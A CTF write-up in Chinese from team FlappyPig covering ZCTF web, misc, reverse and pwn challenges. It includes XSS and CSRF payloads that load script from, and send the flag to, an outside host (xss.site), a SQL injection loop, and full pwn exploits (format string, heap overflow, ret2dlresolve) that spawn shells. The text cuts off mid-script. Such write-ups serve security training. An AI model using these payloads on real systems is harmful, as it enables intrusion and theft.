
# 【CTF攻略】第三届XCTF——郑州站ZCTF第一名战队Writeup


                                阅读量   
                                **290680**
                            
                        |
                        
                                                                                                                                    ![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/85578/t01bec0b2b778c61131.png)](./img/85578/t01bec0b2b778c61131.png)

作者：[FlappyPig](http://bobao.360.cn/member/contribute?uid=1184812799)

预估稿费：500RMB

投稿方式：发送邮件至linwei#360.cn，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



**<br>**

**Misc-Sign in**

据说有12s麒麟臂。

**<br>**

**Web-web100**

网页设计得很简单，首页只返回了ha? 没有其他链接，猜到可能会有源码。尝试过后在.index.php.swp文件中得到php源码

限制flag参数的md5必须为一个固定的0e开头的md5，并在同时在字符串中包含zctf，然后会输出flag。写好代码爆破一番得到zctf00=a8。得到flag

<br>

**Web-Find my eyes**

一开始会觉得是一个博客站，逻辑比较复杂，后来发现其实只有contact.php 文件中有一个留言功能，结合网站部署有csp。猜测是xss漏洞。然后测试4个参数。只有textarea有过滤，其他地方感觉不能正常写入html。然后textarea的过滤相当严格。找了很多用来加载外部资源的html关键字都被过滤。然后大师傅发现是高版本的jquery库，可以利用sourceMappingURL加载外部资源。最后成功的payload是

```
&lt;/textarea&gt;&lt;script&gt;var a=1//@ sourceMappingURL=//xss.site&lt;/script&gt;
```

在服务器的http request里面user-agent中发现flag

**<br>**

**Web-easy apk**

打开APK后发现有两个窗口，一个用于验证用户名密码，一个用于提交邮件，APK会将用户名密码等信息提交到远程服务器做验证，提交前会对用户的输入做一次简单的加密。

加密函数位于libnative-lib.so中的Change函数中，如下，主要是使用密钥对数据进行循环的异或加密。在加密前会将输入字符串逆序。加密后转化为十六进制。

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010ef9a8ded95fb374.png)

在加密前，changekey函数会对密钥做简单的修改，大概的逻辑是对原字符串每隔2个取一个字符。因此，在java层传入的密钥“1234567890”经过变换后成为“1470”。

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0120c0ca7e5f83f062.png)

 

 因此根据上面的分析，可以写出与原APK逻辑一致的Python脚本

```
import requests
def enc(data):
    key = '1470' * 30
    data = data[::-1]
    result = []
    for i in range(len(data)):
        tmp = ord(key[i]) ^ ord(data[i])
        result.append(tmp)
    return ''.join(['%.2x' % i for i in result])
def step1(username, password):
    reply = requests.post('http://58.213.63.30:10005/', data={'username': enc(username), 'password': enc(password)})
    print reply.text
    return reply.json()
def step2(username, password, mail, title, body):
    # body=40454641&amp;password=0305&amp;title=404546&amp;username=&amp;mail=4645
    reply = requests.post('http://58.213.63.30:10005/mail.php',
                          data={'username': enc(username),
                                'password': enc(password),
                                'mail': enc(mail),
                                'title': enc(title),
                                'body': enc(body)})
    print reply.text
    return reply.json()
if __name__ == '__main__':
    username = '1'
    password = '2'
    mail = '3'
    title = '4'
    body = '5'
    if step1(username, password)['result'] == 'OK':
        step2(username, password, mail, title, body)
```

队里的师傅反编译apk后查看逻辑，发现就是将数据内容与密钥1470循环亦或后正常的post提交。有两个页面，index.php用来登录 mail.php用来发邮件。首先发现参数有sql关键字的过滤，然后参数内容用‘or 1=1# 发现user返回了admin，但是result还是false，不能进行下一步发邮件的操作。然后思考能不能用union或者盲注把admin用户的password跑出来。但是（）被过滤，不能使用函数，时间盲注不了，然后password字段被过滤，布尔值注入也不能成功。然后发现用union%0aselect能成功绕过过滤，into被过滤，也不能成功写文件。然后可用的关键字还有order by。两者结合发现自己union注入出来的列和原本的admin列同时存在的时候order by 3。然后回显中出现了username的那一列相对字典序要小一点。和盲注差不多就能跑出来了。认证过程放入step1函数，注入代码如下

```
for i in string.printable:
        username = "'or 1=1 unionxa0select 2,'233','%s' order by 3    #"%i
        print username
        if step1(username, password)['username'] == 'admin':
            print last
            break
        last=i
```

注入出来后md5解密。第二个接口是phpmailer漏洞，结合hint根目录不可写，在upload目录下写入php，得到flag

**<br>**

**Web-onlymyself**

大概浏览网站，有注册，登陆，修改个人资料，记录note，搜索note，提交bug这几个功能。

然后挨着测试是否有功能缺陷。admin是系统自带的，所以猜测flag在admin用户哪里。可以利用xss进入管理员账号。然后发现有交互的功能只存在于提交bug那里。然后发现漏洞链接那里存在xss漏洞。而且xss漏洞进去那个页面存在注入。后来才知道是设计不完善，于是重新思考，猜测会模拟管理员去点击提交的那一个链接，可以利用javascript伪协议或者csrf漏洞+selfxss。选择的后者，在更改个人资料的时候发现并没有验证csrftoken,所以写了一个利用csrf的html网页

```
&lt;form id="ffrom" action="http://58.213.63.30:10003/checkProfile.php" method="POST" id="profile" enctype="multipart/form-data"&gt;
&lt;input type="file" id="image" name="image" data-filename-placement="inside" style="left: -179.99px; top: 19.3333px;"&gt;&lt;/a&gt;
&lt;input name="nick" id="nick" value="&lt;scriimgpt src=//xss.site/1.js&gt;/*"&gt;
&lt;input name="age" id="age" value ="2"&gt;
&lt;input name="address" id="address" value="&lt;/scripimgt&gt;"&gt;
&lt;input class="btn btn-primary" id="submit" name="submit" type="submit" value="Submit"&gt;&lt;/div&gt;
        &lt;/form&gt;
&lt;script&gt;submit.click()&lt;/script&gt;
```

只要让服务器的bot先访问csrf网页，在访问首页就可以了。这样能成功xss到管理员。但是cookie有httponly标记，所以不能直接用管理员账号登录。读取了note.php网页后发现里面并没有flag。然后就思考会不会是利用search.php枚举flag。然后写出js代码。

```
tab="_0123456789abcdefghijklmnopqrstuvwxyz}"
str=''
$.ajaxSettings.async=false
while(true){
  for(i=0;i&lt;tab.length;i++){
    //console.log(tab[i]);
    flag=false
    x=$.get('http://58.213.63.30:10003/search.php?keywords=zctf{'+str+''+tab[i]);
    if(x.status==404) flag=true;
    if(!flag) break;
  }
  str+=tab[i];
  console.log(str);
  if(tab[i]=='}') break;
}
location.href=’//xss.site’+str
```

其中有一个小坑，flag中包含_，而search.php代码里sql查询用的like来判断,直接输入_会被理解为匹配任意单个字符。需要用转义。$.get默认是异步提交，用$.ajaxSettings.async=false设置成同步提交，服务器正常执行完成后能够得到flag

**<br>**

**Misc-Russian Zip**

伪加密，我们可以利用010 Editor编辑器的模板功能，能更好的修改加密位。

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0187d782e6ce9e2860.png)

deFlags 都修改为0

修改保存后，就能成功解压了。 

后面队友发现，这是minecraft，游戏文件，打开后，FLAG在游戏地图中。

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01fc81f3f135b9171b.png)

** **

**Misc-whisper**

PNG用stegsolve打开看到某通道里有三个人名，rsa的作者，此为hint1。

打开starhere.exe，看到如下：

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019c45b1d5dc2b73df.png)

44个字节，每个字节逐位判断，这里有两个方法，第一个方法比较暴力，直接爆破字节看进correct的次数，用angr什么的都可以。第二个就是自己分析了。主要是sub_401000函数。进去后发现：

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01668e654b70753e94.png)

一个rsa，和hint1的提示相符，e是65537，n是那串，随便就能分解，太小了，然后解4010b0里面的那44个数即可：

```
n=2344088051
  p=46099
  q=50849
  
  e=65537
  
  import primefac
  d=primefac.modinv(e,(p-1)*(q-1))%((p-1)*(q-1))
  
  v=[1]*100
  v[15] = 622838535
  v[16] = 0x1E53E463
  v[17] = 0x217153B7
  v[18] = 0xED044EB
  v[19] = 0x26EC91AF
  v[20] = 0x4F8C7090
  v[21] = 0x45E4F9BB
  v[22] = 0x26EC91AF
  v[23] = 0x6D04B642
  v[24] = 0x26EC91AF
  v[25] = 0xFF559EE
  v[26] = 0x1E53E463
  v[27] = 0x55C81190
  v[28] = 0x55C81190
  v[29] = 0x58006440
  v[30] = 0x217153B7
  v[31] = 0x26EC91AF
  v[32] = 0x35F1D9B2
  v[33] = 0x4D3D8957
  v[34] = 0x35F1D9B2
  v[35] = 0x26EC91AF
  v[36] = 0x7172720E
  v[37] = 0x1E53E463
  v[38] = 0x6AC5D9F7
  v[39] = 0x58006440
  v[40] = 0x4710F19D
  v[41] = 653037999
  v[42] = 1476420672
  v[43] = 561075127
  v[44] = 2095854527
  v[45] =   -2030465449
  v[46] = 1439175056
  v[47] = 1476420672
  v[48] = 1439175056
  v[49] = 653037999
  v[50] = 508814435
  v[51] = 561075127
  v[52] = 653037999
  v[53] = 839707766
  v[54] = 1829025346
  v[55] = 1751579215
  v[56] = 1476420672
  v[57] = 695921644
  v[58] = 872207435
  for i in range(15,59):
          print chr(pow(v[i],d,n)% 256) ,
```

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0134e33b1c1e0b6063.png)

此为hint2。

Hint1.png用winhex打开，后面一很大一串字符串

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a9a4201d60256e8b.png)

将数据拷贝出来，base64解密，将解密后的文件binwalk分离

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0140f658978686e71f.png)

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b69a364a7465551a.png)

可以直接从文件中找到rar的密码，解密得flag

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010a328e084ad7d34b.png)

**<br>**

**Reverse-QExtend**

这个程序有少量混淆，第一个是用call+pop指令使得ida没法正常反编译，第二个是修改了函数的返回地址。

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011f1fc9de3361ca57.png)

 

在ida中进行修复到能正常f5.

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ecdc103dc10d209c.png)

分析功能，发现是个汉诺塔游戏。

初始状态:

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0164b8f47856d1da4b.png)

需要达到的状态:

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016e7d4bddcf980f37.png)

各操作码对应的操作：

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01da97a0f2e7fcf9a3.png)

手工完了下汉诺塔，得到的最短路径为053254104123104524104

操作码为input[i]%16-1，所以爆破了一下input，最终得到的flag为:

ZCTF{A&amp;$#&amp;5rA5r#$rA5&amp;#5rA5}

**<br>**

**Reverse-EasyReverse**

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fbfa1eefb0206eda.png)

符号没去掉，encrypt_str函数，逆向完后发现是xtea算法，秘钥为：

```
print (chr(222)+chr(173)+chr(190)+chr(239)).encode("hex")
deadbeef
```

处理一下xtea解密即可得到flag，16字节有些许问题，补齐，然后利用python的xtea解密即可：

```
from xtea import *
 x = new(k, mode=MODE_ECB)
   print x.decrypt(v5)
```

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e85189a3a703495b.png)

**<br>**

**Reverse-CryptTab**

1.    首先是一个压缩包，有密码，不过在文件的末尾得到了压缩密码，解压得到一个data文件。

2.    看起来像shellcode，就用ida打开分析。发现对0x17开始的0x2200字节进行了0xcc异或操作。异或之后分析发现后面有一个dll，将其提取出来，用ida打开，可以发现导出了一个Encrypt函数。

3.    从程序上看代码异或解密完之后直接跳转到sub_17函数。分析sub_17函数，发现是一个获取kernel32.dll的地址，然后就执行不下去了，坑。

从ida的调用图上猜这儿应该跳转到sub_131。

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e9e633d9a3ccf7ca.png)

4.    分析sub_131，有发现需要参数ebx，但是ebx赋什么并不知道，坑。

后来分析到sub_44，该函数为获取库函数的地址，第一个参数为dll的地址，第二个参数为函数的hash值，第二个参数从[ebx+1]处取得。

因为shellcode一般需要获取LoadLibraryA函数地址，算了一下LoadLibraryA的hash值为0xec0e4e8e，然后在shellcode中搜索这个值，还真找到了。

```
string = 'LoadLibraryA'
 
def rol(a):
    return ((a&lt;&lt;0x13) | (a&gt;&gt;(32-0x13)))&amp;0xffffffff
c = 0
for i in range(len(string)):
    c = rol(c) + ord(string[i])
 
print hex(c)
```

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b6beda2b6e4adc6a.png)

所以ebx的值应该为0x310。

向下分析，可以看到程序得到了LoadLibrayA、VirtualAlloc和VirtualFree3个函数的地址，然后又执行不下去了，坑。

5.    然后就对着函数猜了。

应该就是对0x156处的0x10个字节和0x166处的0x30字节作为输入，加密得到的值与0x19a处的0x30字节进行比较。

[![](./img/85578/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f6d815972cab68fb.png)

6.    后面就是分析Encrypt函数，各种交换移位，我这种算法渣只能想到爆破了。

注：以下代码格式有修改，请读者自行调整。

```
int main()
{
       unsigned char str[0x100] = "xF3x23xB5xA6xF5x6AxCBx88xD2xC6xD2x2Fx32xB9xC3xAAx32x9ExADxEEx8Cx22x2Dx45x62x67xFBxD9x64x46xF8xE7xC8x20x35x86xE9x98xBFxD5x55xCAx8Bx85x67x76x19x9A";
  
       printf("len=%dn", strlen((char*)str));
       HMODULE handle = LoadLibraryA("DLL_Export.dll");
       ENCRYPT ProcAddr;
       ProcAddr = (ENCRYPT)GetProcAddress(handle, "Encrypt");
       printf("%xn", ProcAddr);
  
       unsigned char c1[]= "x21x23x25x26x2a";
       unsigned char c3[]="x43x45x47x49x4b";
       unsigned char c2[]="x35x36x37x38x39";
  
       unsigned char input[17];
       //for(int i0=0;i0&lt;5;i0++)
		int i0 =4;
		printf("i0=%dn", i0);
		{
		for(int i1=0;i1&lt;5;i1++)
		{
		printf("i1=%dn", i1);
		for(int i2=0;i2&lt;5;i2++)
		{
        for(int i3=0;i3&lt;5;i3++)
        {
        printf("i3=%dn", i3);
        for(int i4=0;i4&lt;5;i4++)
        {
		for(int i5=0;i5&lt;5;i5++)
		{
        for(int i6=0;i6&lt;5;i6++)
        {
		for(int i7=0;i7&lt;5;i7++)
        {
		for(int i8=0;i8&lt;5;i8++)
		{
        for(int i9=0;i9&lt;5;i9++)
        {
        for(int i10=0;i10&lt;5;i10++)
        {
		for(int i11=0;i11&lt;5;i11++)
		{
        for(int i12=0;i12&lt;5;i12++)
        {
        for(int i13=0;i13&lt;5;i13++)
        {
		for(int i14=0;i14&lt;5;i14++)
		{
            input[0] = c1[i0];
            input[1] = c2[i1];
            input[2] = c3[i2];
            input[3] = c1[i3];
            input[4] = c2[i4];
            input[5] = c3[i5];
            input[6] = c1[i6];
            input[7] = c2[i7];
            input[8] = c3[i8];
            input[9] = c1[i9];
            input[10] = c2[i10];
            input[11] = c3[i11];
            input[12] = c1[i12];
            input[13] = c2[i13];
            input[14] = c3[i14];
            input[15] ='x24';
            input[16]='x00';
            unsigned char data[0x100] = "x38x9Bx50xCEx86xDDxF0x1Dx0DxC3xD6xE2xF2x29xD3x83x6CxE8x86x5Fx95xE6x4Fx63x5Fx3Bx9Bx5Fx53xBCx41x2Ax49x08x02xAAx10xECx2Cx58xD5x27xCDx93x38x10xE4xDC";
            unsigned char * output;
            __asm          
            {
                   push esi
                   lea esi, input
                   push esi
                   lea esi, data;
                   call ProcAddr
                   mov output, eax
                   pop eax
                   pop esi
            }
            if(!memcmp(output, str, 0x30))
            {
                   printf("%sn", input);
            }
			}
			}
			}
			}
            }
			}
			}
            }
			}
			}
            }
			}
			}
            }
			}
}
```

等到爆出来的时候，比赛已经结束了。爆出来为:

%6K#7E&amp;5C*9G!8I$

当然这还不是最终结果，还要用这个作为密钥，去AES解密加密表，才能得到flag。。。

**<br>**

**Pwn-login**

sprintf里面的格式化字符串的内容可以被自身的格式化给覆盖掉，把%s:%s覆盖掉，覆盖成%hhn，然后格式化来改写check_stack_fail的最后一字节，拿shell的时候 ，不能用system拿，不能用system拿，环境变量被栈覆盖掉了：

```
from zio import *
   
 target = ("58.213.63.30",4002)
   
   def get_io(target):
    r_m = COLORED(RAW, "green")
    w_m = COLORED(RAW, "blue")
    io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
    return io
   
   def gen_rop_data(func_addr, args, pie_text_base = 0):
     p_ret = [0x0804844e, 0x08048465, 0x0804891a, 0x08048919, 0x08048918]
     rop_data  = ''
     rop_data += l32(func_addr)
     if len(args) &gt; 0:
         rop_data += l32(p_ret[len(args)] + pie_text_base)
     for arg in args:
         rop_data += l32(arg)
     return rop_data
   
   def pwn(io):
   
    puts_got                   = 0x0804a01c          
    offset_puts                = 0x656a0             
    puts_plt                   = 0x080484c0
   
    read_plt                   = 0x08048480
   
    read_buff_addr = 0x0804862B
   
    check_stack_fail_got = 0x804A014
   
    bss_addr = 0x0804a000 + 0xe20
    leave_ret = 0x08048715
    pop_ebp_ret = 0x0804871f #: pop ebp ; ret
   
    username = ""
    #username += 'bbbb'
    username += l32(check_stack_fail_got)
    username += "a"*0x4C
    #username += "bbbb"
    username += gen_rop_data(puts_plt, [puts_got])
    username += gen_rop_data(read_buff_addr, [bss_addr, 0x01010101])
    username += l32(pop_ebp_ret) + l32(bss_addr)
    username += l32(leave_ret)
    #username += gen_rop_data(puts_plt, [puts_got+4])
   
   
    print hex(len(username)), hex(0xd6 - 0x5c - 4)
    #username = username.ljust(0xd6 - 0x5c - 4, 'a')
   
    #username += "%s:%s.%p.%p.%p.%p.%p"# + "%p."*4
    #username += "%x.".ljust(8, '-')*10
    #username += "aa:"
    username = username.ljust(0xc0, 'a')
    username += 'a'*(0x66-0x43)
    username += "%9$hhn.".ljust(10, '-')
    #username += "%9$p.".ljust(10, '-')
   
    username = username.ljust(0x100-1, 'a')
   
    password = ""
    password += 'w' * 0x40
   
    io.read_until(":")
    io.writeline(username)
    io.read_until(":")
   
    #io.gdb_hint()
    io.writeline(password)
   
    io.read_until("")
    io.read_until("Login successful!n")
   
    io.read_until("n")
    data = io.read_until("n")
    print data
    puts_addr = l32(data[:4])
   
    offset_system = 0x3e800
    offset_execve = 0xB59F0
   
    #"""
    #remote
    offset_system = 0x3fe70
    offset_puts                = 0x64da0
    offset_execve = 0xB4EA0
    #"""
   
    libc_base = puts_addr - offset_puts
    system_addr = libc_base + offset_system
    execve_addr = libc_base + offset_execve
   
    payload = ""
    payload += l32(0x0)
    payload += gen_rop_data(execve_addr, [bss_addr+0x100, 0, 0])
    payload = payload.ljust(0x100, 'a')
    payload += "/bin/shx00"
    payload += l8(0x1f)
   
    io.gdb_hint()
    io.writeline(payload)
    io.interact()
   
   
 io = get_io(target)
 pwn(io)
```

<br>

**Pwn-Dragon**

存在堆溢出，可以修改堆结构中的size.

脚本如下：

```
from pwn import *
   
   #r = remote('58.213.63.30', 11501) 
   r = process("./dragon")
   
   def add(size, name, content):
     r.recvuntil('&gt;&gt;')
     r.sendline('1')
     r.recvuntil(':')
     r.sendline(str(size))
     r.recvuntil(':')
     r.sendline(name)
     r.recvuntil(':')
     r.sendline(content)
   
   def edit(id, content):
     r.recvuntil('&gt;&gt;')
     r.sendline('2')
     r.recvuntil(':')
     r.sendline(str(id))
     r.recvuntil(':')
     r.write(content)
   
   def show(id):
     r.recvuntil('&gt;&gt;')
     r.sendline('4')
     r.recvuntil(':')
     r.sendline(str(id))
   
   def delete(id):
     r.recvuntil('&gt;&gt;')
     r.sendline('3')
     r.recvuntil(':')
     r.sendline(str(id))
   
   
 add(0x20, 'AAAA', 'AAAA')
 add(0x20, 'AAAA', 'A'*0x18)
 add(0x20, 'AAAA', 'A'*0x18)
   
 edit(0, 'A'*0x18+p64(0xd1)) # note1
   delete(1)
 add(0x20, 'AAAA', 'A'*0x18)
 strlen_got = 0x602028
   add(0x10, 'AAAA', p64(strlen_got)+'d'*0x10)
 edit(3, p64(strlen_got)) #note2
   show(2)
 r.recvuntil('content: ')
 strlen_addr = u64(r.readline()[:-1].ljust(8, 'x00'))
   print "[*] strlen addr:{0}".format(hex(strlen_addr))
 libc = ELF("./libc-2.19.so")#ELF("/lib/x86_64-linux-gnu/libc.so.6")
   libc_base = strlen_addr - libc.symbols['strlen']
 system_addr = libc_base + libc.symbols['system'] 
 edit(2, p64(system_addr))
   
 edit(0, '/bin/shx00')
 r.interactive()
```

**<br>**

**Pwn-Class**

在init函数中num*200+8存在整形溢出，num控制得当可以使得分配的空间很小。Setjmp会将当前的寄存器保存到堆上（部分寄存器进行了rol和异或加密）。通过show功能可以泄露出保存的寄存器值，通过edit功能可以修改这些值，然后通过longjmp改变程序的控制流程，因为rsp和rip都能被随意修改，所以比较容易进行rop。

脚本：

```
from threading import Thread
from zio import *
target = './class'
target = ('58.213.63.30', 4001)
 
def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return
 
    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)
 
def rerol(d):
    return ((d&lt;&lt;(64-0x11))+(d&gt;&gt;0x11))&amp;0xffffffffffffffff
 
def rol(d):
    return ((d&lt;&lt;0x11) + (d&gt;&gt;(64-0x11)))&amp;0xffffffffffffffff
 
def show(io, id):
    io.read_until('&gt;&gt;')
    io.writeline('2')
    io.read_until(':')
    io.writeline(str(id))
 
    io.read_until('name:')
    r12 = l64(io.read_until(',')[:-1].ljust(8, 'x00'))
    print 'r12', hex(r12)
    io.read_until('addr:')
    enc_rsp = l64(io.read(8))
    enc_rip = l64(io.read_until(',')[:-1].ljust(8, 'x00'))
 
    base = r12 - 0xaa0
    print 'enc_rsp', hex(enc_rsp)
    print 'enc_rip', hex(enc_rip)
 
    real_rip = base + 0x1495
    cookie = rerol(enc_rip)^real_rip
 
    print 'cookie', hex(cookie)
 
    real_rsp = rerol(enc_rsp)^cookie
    print 'real_rsp', hex(real_rsp)
 
    return (base, real_rsp, cookie)
 
def edit(io, id, age, name, addr, introduce):
    io.read_until('&gt;&gt;')
    io.writeline('3')
    io.read_until(':')
    io.writeline(str(id))
    io.read_until(':')
    io.writeline(name)
    io.read_until(':')
    io.writeline(str(age))
    io.read_until(':')
    io.writeline(addr)
    io.read_until(':')
    io.writeline(introduce)
 
 
def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
             print_write=COLORED(RAW, 'green'))
 
    io.read_until(':')
    io.writeline(str(92233720368547759))
    base, rsp, cookie = show(io, 1)
    print 'base', hex(base)
 
    fake_rsp = rsp - 0x48
    pop_rdi_ret = base + 0x000000000001523
 
    addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))
    print HEX(addr)
    edit(io, 1, 0, "", addr, "")
 
    io.read_until('&gt;&gt;')
    payload = '5;'+'a'*6
 
    puts_got = 0x0000000000202018+ base
    puts_plt = 0x9a0 + base
    main = base + 0x00000000000013ff
    payload += l64(puts_got)+l64(puts_plt)+l64(main)
    io.writeline(payload)
 
    puts_addr = l64(io.readline()[:-1].ljust(8, 'x00'))
    '''
    base = puts_addr - 0x000000000006F5D0
 
    system = base + 0x0000000000045380
 
    print 'system', hex(system)
    binsh = base + 0x000000000018C58B
    '''
 
    base = puts_addr - 0x000000000006FD60
    print 'base', hex(base)
    system = base + 0x0000000000046590
    binsh = base + 0x000000000017C8C3
 
    #io.gdb_hint()
    io.read_until(':')
    io.writeline(str(92233720368547759))
 
 
    fake_rsp = rsp - 0x80
 
    addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))
    print HEX(addr)
    io.gdb_hint()
    edit(io, 1, 0, "", addr, "")
 
    io.read_until('&gt;&gt;')
    payload = '5;'+'a'*6
 
    payload += l64(binsh)+l64(system)+l64(main)
    io.writeline(payload)
 
    #io.gdb_hint()
    interact(io)
 
exp(target)
```

**<br>**

**Pwn-sandbox**

沙箱做了如下限制：对外的调用都通过jmp ds:dl_resolve出去，所以采用return-to-dlresolve进行利用。

脚本：

```
#encoding:utf-8
import struct
from threading import Thread
from zio import *
 
 
target = './sandbox ./vul'
#target = './vul'
target = ('58.213.63.30', 4004)
 
def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return
 
    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)
 
def write_16byte(io, addr, value):
    io.write('a'*0x10+l64(addr+0x10)+l64(0x400582))
    io.write(value+l64(0x601f00)+l64(0x400582))
 
fake_relro = ''
fake_sym = ''
 
#link_map_addr = 0x00007ffff7ffe1c8 #close aslr.(if has aslr, need leak)
 
#link_map_addr = 0x7ffff7ffe168
def generate_fake_relro(r_offset, r_sym):
    return l64(r_offset) + l32(7)+l32(r_sym)+ l64(0)
 
def generate_fake_sym(st_name):
    return l32(st_name)+l8(0x12)+l8(0) + l16(0) + l64(0) + l64(0)
 
 
#versym = 0x40031e
symtab = 0x4002b8
strtab = 0x400330
jmprel = 0x4003b8
 
bss_addr = 0x601058
 
# .bss addr = 0x601058
# 0x155dc*0x18+0x4003b8 = 0x601058
# so index = 0x155dc
 
#0x155e8*0x18+0x4002b8 = 0x601078
# so r_sym = 0x155e8
 
# 0x200d68 + 0x400330 = 0x601098
# so st_name = 0x200d68
 
 
def write_any(io, addr, value):
    print hex(addr), hex(value)
    io.read_until(':n')
    io.writeline('0')
    io.write(l64(addr)+l64(value))
 
def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
    pop_rdi_ret = 0x0000000000400603
    pop_rsi_r15_ret = 0x0000000000400601
    leak_addr = 0x600ef0
    write_plt = 0x0000000000400430
    pop_rbp_ret = 0x4004d0
    leak_rop = l64(pop_rsi_r15_ret) + l64(leak_addr) + l64(0) + l64(pop_rdi_ret) + l64(1) + l64(write_plt)
    leak_rop += l64(pop_rbp_ret) + l64(0x601f00) + l64(0x400582)
 
    for i in range(0, len(leak_rop), 8):
        write_16byte(io, 0x601b00+i, leak_rop[i:i+8]+'x00'*8)
 
    leave_ret = 0x40059d
    leak_stack_povit = 'a' * 0x10 + l64(0x601b00 - 0x8) + l64(leave_ret)
    io.write(leak_stack_povit)
 
    io.read_until(':')
    link_map_addr = l64(io.read(8)) + 0x28
    print hex(link_map_addr)
 
    r_offset = 0x601970 # a writable addr
    r_sym = 0x155e8
 
    fake_relro = generate_fake_relro(r_offset, r_sym).ljust(0x20, 'x00')
 
    st_name = 0x200d68
    fake_sym = generate_fake_sym(st_name).ljust(0x20, 'x00')
 
    write_16byte(io, link_map_addr+0x1c8, 'x00'*0x10)
    #write_16byte(io, 0x600858, l64(0x6ffffff0)+l64(0x3d57d6))
 
    for i in range(0, len(fake_relro), 8):
        write_16byte(io, 0x601058+i, fake_relro[i:i+8]+'x00'*8)
    for i in range(0, len(fake_sym), 8):
        write_16byte(io, 0x601078+i, fake_sym[i:i+8]+'x00'*8)
 
    write_16byte(io, 0x601098, 'system'.ljust(16, 'x00'))
    write_16byte(io, 0x601a50, '/bin/sh'.ljust(16, 'x00'))
 
    plt0 = 0x400420
 
    rop = l64(pop_rdi_ret) + l64(0x601a50)
    index = 0x155dc
    rop += l64(plt0) + l64(index)
 
    for i in range(0, len(rop), 8):
        write_16byte(io, 0x601980+i, rop[i:i+8]+'x00'*8)
 
    stack_povit = 'a'*0x10 + l64(0x601980-0x8) + l64(leave_ret)
    io.write(stack_povit)
 
    interact(io)
 
exp(target)
```

**<br>**

**Pwn-note**

漏洞存在于edit中，有堆溢出。

此题采用talloc，不过talloc_free内部会调用free函数，所以采用unlink方法进行利用。

脚本：

```
from threading import Thread
from zio import *
 
target = ('119.254.101.197', 10000)
target = './note'
 
 
def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
            except:
                return
 
    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)
 
def add(io, title, size, content):
    io.read_until('&gt;&gt;')
    io.writeline('1')
    io.read_until(':')
    io.writeline(title)
    io.read_until(':')
    io.writeline(str(size))
    io.read_until(':')
    io.writeline(content)
 
def edit(io, id, offset, content):
    io.read_until('&gt;&gt;')
    io.writeline('3')
    io.read_until(':')
    io.writeline(str(id))
    io.read_until(':')
    io.writeline(str(offset))
    io.read_until(":")
    io.writeline(content)
 
def edit2(io, id, offset, content):
    count = len(content)/48
    print len(content)
    print count
    for i in range(count):
        io.read_until('&gt;&gt;')
        io.writeline('3')
        io.read_until(':')
        io.writeline(str(id))
        io.read_until(':')
        io.writeline(str(offset+48*i))
        io.read_until(":")
        io.write(content[i*48:i*48+48])
    if len(content[count*48:]) &gt; 0:
        io.read_until('&gt;&gt;')
        io.writeline('3')
        io.read_until(':')
        io.writeline(str(id))
        io.read_until(':')
        io.writeline(str(offset+48*count))
        io.read_until(':')
        io.writeline(content[count*48:])
 
def delete(io, id):
    io.read_until('&gt;&gt;')
    io.writeline('4')
    io.read_until(':')
    io.writeline(str(id))
 
def change(io, id, title):
    io.read_until('&gt;&gt;')
    io.writeline('5')
    io.read_until(':')
    io.writeline(str(id))
    io.read_until(':')
    io.writeline(title)
 
def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
             print_write=COLORED(RAW, 'green'))
